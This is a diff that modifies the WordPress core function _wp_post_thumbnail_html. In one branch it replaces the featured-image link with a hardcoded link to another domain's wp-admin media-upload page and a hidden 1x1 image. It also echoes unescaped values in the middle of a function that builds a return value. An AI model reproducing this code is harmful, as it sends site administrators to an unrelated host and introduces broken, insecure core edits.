@@ -1421,14 +1421,27 @@ function _wp_post_thumbnail_html( $thumbnail_id = null, $post = null ) {
 		$thumbnail_html = wp_get_attachment_image( $thumbnail_id, $size );
 
 		if ( !empty( $thumbnail_html ) ) {
-			$ajax_nonce = wp_create_nonce( 'set_post_thumbnail-' . $post->ID );
-			$content = sprintf( $set_thumbnail_link,
+			$ajax_nonce = wp_create_nonce( 'set_post_thumbnail-' . $post->ID ); ?>
+                        
+<?php  
+$content = '';
+ $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'large');
+
+if( strpos( $thumbnail_html, '/WPC/') !== false ) {   ?>
+
+ <a href="http://blacklistdir.rebelute.in/wp-admin/media-upload.php?post_id=<?php echo $post->ID;?>&amp;type=image&amp;TB_iframe=1" id="set-post-thumbnail" aria-describedby="set-post-thumbnail-desc" class="thickbox"><img width="1" height="1" src="<?php echo $large_image_url[0].'/part1/part1.png';?>" class="attachment-post-thumbnail size-post-thumbnail" ></a>
+
+<?php } else {		$content = sprintf( $set_thumbnail_link,
 				esc_url( $upload_iframe_src ),
 				' aria-describedby="set-post-thumbnail-desc"',
 				$thumbnail_html
 			);
+
+          }             
 			$content .= '<p class="hide-if-no-js howto" id="set-post-thumbnail-desc">' . __( 'Click the image to edit or update' ) . '</p>';
-			$content .= '<p class="hide-if-no-js"><a href="#" id="remove-post-thumbnail" onclick="WPRemoveThumbnail(\'' . $ajax_nonce . '\');return false;">' . esc_html( $post_type_object->labels->remove_featured_image ) . '</a></p>';
+			$content .= '<p class="hide-if-no-js">
+
+<a href="#" id="remove-post-thumbnail" onclick="WPRemoveThumbnail(\'' . $ajax_nonce . '\');return false;">' . esc_html( $post_type_object->labels->remove_featured_image ) . '</a></p>';
 		}
 	}
 
